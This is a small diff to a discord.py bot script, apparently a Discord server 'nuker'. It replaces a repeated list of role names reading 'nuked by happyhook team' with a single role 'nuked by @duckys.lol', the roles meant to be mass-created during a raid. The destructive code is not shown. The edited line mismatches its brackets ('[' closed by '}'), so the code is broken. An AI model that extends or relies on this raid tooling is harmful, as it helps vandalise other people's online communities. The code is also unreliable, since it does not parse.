@@ -7,8 +7,7 @@ intents.guilds = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 # A rangok listája, amiket létre szeretnél hozni
-roles_to_create = ['nuked by happyhook team', 'nuked by happyhook team', 'nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team','nuked by happyhook team', 'nuked by happyhook team',]
-
+roles_to_create = ["nuked by @duckys.lol"}
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user}!')
